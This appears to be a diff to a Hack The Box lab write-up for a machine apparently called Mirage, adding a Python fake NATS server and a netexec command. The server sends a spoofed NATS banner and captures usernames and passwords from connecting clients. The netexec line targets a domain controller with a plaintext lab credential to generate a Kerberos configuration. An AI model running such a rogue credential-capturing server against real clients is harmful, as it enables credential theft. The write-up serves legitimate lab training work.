@@ -1266,3 +1266,80 @@ todd.wolfe is there, matching up with what was in the Excel workbook. I’ll rec
 ```
 PS C:\> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 ```
+
+***
+
+PYTHON NATS SERVER SIMULATION
+
+{% code fullWidth="true" %}
+```python
+import socket
+import json
+
+HOST = '0.0.0.0'
+PORT = 4222
+
+INFO_MSG = (
+    'INFO {"server_id":"Zk0GQ3JBSrg3oyxCRRlE09",'
+    '"version":"1.2.0","proto":1,"go":"go1.10.3",'
+    '"host":"0.0.0.0","port":4222,"max_payload":1048576,"client_id":2392}\r\n'
+)
+
+def parse_connect(data):
+    lines = data.split(b'\r\n')
+    for line in lines:
+        if line.startswith(b'CONNECT '):
+            try:
+                json_part = line[8:].strip()
+                auth_data = json.loads(json_part)
+                return auth_data.get("user"), auth_data.get("pass")
+            except Exception as e:
+                print(f"[!] Erreur parsing CONNECT: {e}")
+    return None, None
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen(5)
+    print(f"[+] Faux serveur NATS en écoute sur {HOST}:{PORT}")
+    while True:
+        conn, addr = s.accept()
+        with conn:
+            print(f"[+] Connexion de {addr}")
+            
+            # ✉️ Envoie du message INFO
+            conn.sendall(INFO_MSG.encode())
+
+            data = b""
+            try:
+                conn.settimeout(2)
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+            except socket.timeout:
+                pass
+            except Exception as e:
+                print(f"[!] Erreur socket: {e}")
+
+            print(f"[DEBUG] Données reçues:\n{data.decode(errors='ignore')}")
+            user, password = parse_connect(data)
+            if user or password:
+                print(f"[🔥] Auth capturée : user = {user} | password = {password}")
+            else:
+                print("[✖] Aucun identifiant détecté")
+
+            print(f"[-] Connexion fermée {addr}")
+
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Generate the KRB configuration</mark>
+
+{% code fullWidth="true" %}
+```
+netexec smb DC01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -k --generate-krb5-file krb5.conf
+```
+{% endcode %}
